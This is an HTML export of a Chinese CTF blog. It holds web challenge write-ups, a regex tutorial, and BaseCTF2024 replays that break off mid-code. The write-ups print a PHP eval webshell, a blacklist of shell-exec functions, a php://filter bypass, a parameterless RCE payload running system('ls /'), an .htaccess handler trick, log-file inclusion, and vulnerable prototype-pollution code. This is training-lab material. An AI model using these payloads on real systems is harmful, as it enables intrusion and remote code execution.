src="https://pic1.imgdb.cn/item/694677f429a616e52861758a.png"></p><h2 id="浮光"><a href="#浮光" class="headerlink" title="浮光"></a>浮光</h2><p>打开发现什么都没有，先拿dirsearch扫一下</p><p><img src="https://pic1.imgdb.cn/item/6946788729a616e528617753.png"></p><p>发现源码泄露</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><br><span class="hljs-comment">#被你找到了:(</span><br><span class="hljs-comment">#给你准备了一份小礼物放在了gift.php中了哦~</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>    <span class="hljs-variable">$blacklist</span> = [<br>        <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;phar&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;expect&#x27;</span>, <span class="hljs-string">&#x27;ftp&#x27;</span>,<br>        <span class="hljs-string">&#x27;etc&#x27;</span>, <span class="hljs-string">&#x27;proc&#x27;</span>,<br>        <span class="hljs-string">&#x27;base64&#x27;</span>,  <span class="hljs-string">&#x27;string&#x27;</span>,  <span class="hljs-string">&#x27;rot13&#x27;</span>, <span class="hljs-string">&#x27;quoted&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;ter/res&#x27;</span>,<br>        <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;echo&#x27;</span><br>    ];<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$keyword</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$keyword</span>) !== <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-comment">#直接读文件是不可以的~</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$file</span>, FILTER_VALIDATE_URL))&#123;<br>    <span class="hljs-comment">#waf?!</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-variable">$content</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;waf!!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;无效的url格式&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php存在文件读取漏洞，不过过滤比较严格，既然有小礼物，那就读一下gift.php吧</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">/?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.iconv.UCS<span class="hljs-number">-4</span>*.UCS<span class="hljs-number">-4</span>BE/resource=gift.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#礼物是一份shell哦, 快来执行命令吧:)</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m1xian&#x27;</span>]))&#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m1xian&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>正则表达式</strong>：<code>/[^\W]+\((?R)?\)/</code>用于匹配类似函数调用的模式（如<code>abc()</code>或<code>abc(def())</code>），其中参数必须是另一个函数调用或为空。</p><p>phpinfo();   Th1s_1s_n0t_wh2t_yo3_w4nt 被骗了</p><p>想起之前ctfshow做的一句话木马变形用的无参rce，拿来用用</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">m1xian</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">array_pop</span>(<span class="hljs-title">next</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-number">1</span>=<span class="hljs-title">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);</span><br></code></pre></td></tr></table></figure><p>成功</p><p><img src="https://pic1.imgdb.cn/item/69467a3129a616e528617d26.png"></p><h2 id="ez-blog-2-0"><a href="#ez-blog-2-0" class="headerlink" title="ez_blog_2.0"></a>ez_blog_2.0</h2><p>虽然我不会做但我会把容器搞坏(bushi)</p><p>存在目录穿越漏洞，结合apache上传.htaccess</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;\.txt&quot;</span>&gt;</span><br>  <span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/69467c6d29a616e52861873b.png"></p><p>一传上去容器就嘎了</p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="数据分析1"><a href="#数据分析1" class="headerlink" title="数据分析1"></a>数据分析1</h2><p><img src="https://pic1.imgdb.cn/item/69467a9329a616e528617e53.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Caser？"><a href="#Caser？" class="headerlink" title="Caser？"></a>Caser？</h2><p>使用随波入流工具结合hint</p><p><img src="https://pic1.imgdb.cn/item/69467b1729a616e52861808e.png"></p><h2 id="你知道RSA吗"><a href="#你知道RSA吗" class="headerlink" title="你知道RSA吗"></a>你知道RSA吗</h2><p>ai真强大</p><ol><li><strong>计算模数 n</strong>：<code>n = p × q = 91790401643935968086245576021782314389461981833511001951332959943149406173651</code></li><li><strong>计算欧拉函数 φ(n)</strong>：<code>φ(n) = (p-1) × (q-1) = 91790401643935968086245576021782314388855762181985072030992771608097748260704</code></li><li><strong>计算私钥 d（e 的模 φ(n) 逆元）</strong>：通过扩展欧几里得算法求得：<code>d = 2140100000182098039821524332228868828084465334300825336273508934146716501249</code></li></ol><h1 id="补档"><a href="#补档" class="headerlink" title="补档"></a>补档</h1><h2 id="ez-blog2-0"><a href="#ez-blog2-0" class="headerlink" title="ez_blog2.0"></a>ez_blog2.0</h2><p>之前失败是因为目录没有r权限</p><p>利用不安全的递归创建目录创建一个新目录放脚本即可</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式</title>
    <link href="/2025/12/18/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2025/12/18/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>正则表达式是一种用于匹配和操作文本的强大工具，它是由一系列字符和特殊字符组成的模式，用于描述要匹配的文本模式。</p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">import</span> re<br>&gt;&gt;&gt;tel=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d\d\d-\d\d\d-\d\d\d\d&#x27;</span>)<br>&gt;&gt;&gt;mo=tel.search(<span class="hljs-string">&#x27;my phone number is 415-555-4242&#x27;</span>)<br>&gt;&gt;&gt;mo.group()<br><span class="hljs-number">415</span>-<span class="hljs-number">555</span>-<span class="hljs-number">4242</span><br></code></pre></td></tr></table></figure><p>其中r’’用于传入原始字符串，tel是一个regex对象，mo是一个match对象</p><h3 id="利用括号分组"><a href="#利用括号分组" class="headerlink" title="利用括号分组"></a>利用括号分组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;tel=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;(\d\d\d)-(\d\d\d-\d\d\d\d)&#x27;</span>)<br>&gt;&gt;&gt;mo=tel.search(<span class="hljs-string">&#x27;my phone number is 415-555-4242&#x27;</span>)<br>&gt;&gt;&gt;mo.group(<span class="hljs-number">1</span>)<br><span class="hljs-number">415</span><br>&gt;&gt;&gt;mo.group(<span class="hljs-number">0</span>)<br><span class="hljs-number">415</span>-<span class="hljs-number">555</span>-<span class="hljs-number">4242</span><br>&gt;&gt;&gt;mo.groups()<br>(<span class="hljs-string">&#x27;415&#x27;</span>,<span class="hljs-string">&#x27;555-4242&#x27;</span>)<br>&gt;&gt;&gt;a,b=mo.groups()<br>&gt;&gt;&gt;a<br>&gt;&gt;&gt;<span class="hljs-number">415</span><br></code></pre></td></tr></table></figure><h3 id="管道符匹配多个分组"><a href="#管道符匹配多个分组" class="headerlink" title="管道符匹配多个分组"></a>管道符匹配多个分组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;tel=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;Batman|Tina&#x27;</span>)<br>&gt;&gt;&gt;tel=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;Bat(man|mobile)&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="可选匹配"><a href="#可选匹配" class="headerlink" title="可选匹配"></a>可选匹配</h3><table><thead><tr><th>符号</th><th>次数</th></tr></thead><tbody><tr><td>？</td><td>零次或一次</td></tr><tr><td>*</td><td>任意次数（包括零次）</td></tr><tr><td>+</td><td>一次或多次</td></tr><tr><td>{}</td><td>特定次数</td></tr><tr><td>?*</td><td><strong>0 次或多次</strong>（非贪婪模式：尽可能少匹配）</td></tr></tbody></table><h3 id="特殊字符类元字符"><a href="#特殊字符类元字符" class="headerlink" title="特殊字符类元字符"></a>特殊字符类元字符</h3><ul><li><p>\d 匹配任意数字，等价于 <code>[0-9]</code></p></li><li><p>\D 匹配任意非数字，等价于 <code>[^0-9]</code></p></li><li><p>\w 匹配任意单词字符(字母、数字、下划线)，等价于 <code>[a-zA-Z0-9_]</code></p></li><li><p>\W 匹配任意非单词字符，等价于 <code>[^a-zA-Z0-9_]</code></p></li><li><p>\s 匹配任意空白字符(空格、制表符、换行符等)</p></li><li><p>\S 匹配任意非空白字符</p></li></ul><h3 id="字符类元字符"><a href="#字符类元字符" class="headerlink" title="字符类元字符"></a>字符类元字符</h3><p><code>[]</code> (方括号)</p><ul><li>定义字符集合，匹配其中任意一个字符</li><li>示例：<code>[aeiou]</code> 匹配任意一个元音字母</li></ul><p><code>[^]</code> (否定字符类)</p><ul><li>匹配不在方括号中的任意字符</li><li>示例：<code>[^0-9]</code> 匹配任意非数字字符</li></ul><p><code>-</code> (连字符)</p><ul><li>在字符类中表示范围</li><li>示例：<code>[a-z]</code> 匹配任意小写字母</li></ul><h3 id="基本元字符"><a href="#基本元字符" class="headerlink" title="基本元字符"></a>基本元字符</h3><p><code>.</code> (点号)</p><ul><li><p>匹配除换行符(<code>\n</code>)外的任意单个字符</p><p>示例：<code>a.b</code> 匹配 “aab”, “a1b”, “a b” 等</p></li></ul><p><code>^</code> (脱字符)</p><ul><li>匹配字符串的开始位置</li><li>示例：<code>^abc</code> 匹配以 “abc” 开头的字符串</li></ul><p><code>$</code> (美元符)</p><ul><li>匹配字符串的结束位置</li><li>示例：<code>xyz$</code> 匹配以 “xyz” 结尾的字符串</li></ul><p><code>\</code> (反斜杠)</p><ul><li>转义字符，使后面的字符失去特殊含义</li><li>示例：<code>\.</code> 匹配实际的点号而不是任意字符</li></ul><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>一个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys.*nb/is&#x27;</span>,<span class="hljs-variable">$xdmtql</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF2024复现</title>
    <link href="/2025/11/30/BaseCTF2024%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/11/30/BaseCTF2024%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><br><span class="hljs-variable">$incompetent</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;incompetent&#x27;</span>]; <br><span class="hljs-variable">$Datch</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Datch&#x27;</span>]; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$incompetent</span> !== <span class="hljs-string">&#x27;HelloWorld&#x27;</span>) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;写出程序员的第一行问候吧！&#x27;</span>); <br>&#125; <br><br><span class="hljs-comment">//这是个什么东东？？？ </span><br><span class="hljs-variable">$required_chars</span> = [<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>]; <br><span class="hljs-variable">$is_valid</span> = <span class="hljs-literal">true</span>; <br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$required_chars</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$Datch</span>, <span class="hljs-variable">$char</span>) === <span class="hljs-literal">false</span>) &#123; <br>        <span class="hljs-variable">$is_valid</span> = <span class="hljs-literal">false</span>; <br>        <span class="hljs-keyword">break</span>; <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_valid</span>) &#123; <br><br>    <span class="hljs-variable">$invalid_patterns</span> = [<span class="hljs-string">&#x27;php://&#x27;</span>, <span class="hljs-string">&#x27;http://&#x27;</span>, <span class="hljs-string">&#x27;https://&#x27;</span>, <span class="hljs-string">&#x27;ftp://&#x27;</span>, <span class="hljs-string">&#x27;file://&#x27;</span> , <span class="hljs-string">&#x27;data://&#x27;</span>, <span class="hljs-string">&#x27;gopher://&#x27;</span>]; <br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$invalid_patterns</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pattern</span>) &#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$Datch</span>, <span class="hljs-variable">$pattern</span>) !== <span class="hljs-literal">false</span>) &#123; <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;此路不通换条路试试?&#x27;</span>); <br>        &#125; <br>    &#125; <br><br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$Datch</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;文件名不合规 请重试&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>这里是一个文件包含，并且不可以通过伪协议来进行读取，它提示我们需要在提交中包含一些字母</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-symbol">&#x27;s</span>&#x27;, <span class="hljs-symbol">&#x27;e</span>&#x27;, <span class="hljs-symbol">&#x27;v</span>&#x27;, <span class="hljs-symbol">&#x27;a</span>&#x27;, <span class="hljs-symbol">&#x27;n</span>&#x27;, <span class="hljs-symbol">&#x27;x</span>&#x27;, <span class="hljs-symbol">&#x27;r</span>&#x27;, <span class="hljs-symbol">&#x27;o</span>&#x27;]<br></code></pre></td></tr></table></figure><p>这里因为不能进行常规的文件包含，所以需要通过包含一些特殊的路径</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">incompetent=HelloWorld&amp;Datch=<span class="hljs-regexp">/var/</span><span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/cookiescs/p/18696979">CTFShow-Web160：利用日志包含漏洞进行文件上传 - Zebra233 - 博客园</a></p><h1 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>req = requests.session() <span class="hljs-comment">#实例化session对象</span><br>url = <span class="hljs-string">&quot;http://challenge.imxbt.cn:32583/&quot;</span><br><br>answer = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    response = req.post(url , data=&#123;<span class="hljs-string">&quot;answer&quot;</span>: answer&#125;) <span class="hljs-comment">#POST答案，获取响应</span><br>    <span class="hljs-built_in">print</span>(response.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;BaseCTF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(response.text)<br>        <span class="hljs-keyword">break</span><br>    regex = <span class="hljs-string">r&quot; (\d*?)(.)(\d*)\?&quot;</span> <span class="hljs-comment">#正则表达式</span><br>    <span class="hljs-keyword">match</span> = re.search(regex, response.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;+&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) + <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;-&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) - <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;×&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) * <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) == <span class="hljs-string">&quot;÷&quot;</span>:<br>        answer = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)) // <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure><p><a href="https://www.runoob.com/python3/python-requests.html">Python requests 模块 | 菜鸟教程</a></p><p><a href="https://www.runoob.com/python/python-reg-expressions.html">Python 正则表达式 | 菜鸟教程</a></p><h1 id="圣钥之战1-0"><a href="#圣钥之战1-0" class="headerlink" title="圣钥之战1.0"></a>圣钥之战1.0</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_json</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        json.loads(data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/static/index.html&#x27;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Read</span>():<br>    file = <span class="hljs-built_in">open</span>(__file__, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;J1ngHong说：你想read flag吗？</span><br><span class="hljs-string">那么圣钥之光必将阻止你！</span><br><span class="hljs-string">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="hljs-string"><span class="hljs-subst">&#123;file&#125;</span></span><br><span class="hljs-string">&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/pollute&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Pollution</span>():<br>    <span class="hljs-keyword">if</span> request.is_json:<br>        merge(json.loads(request.data),instance)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span 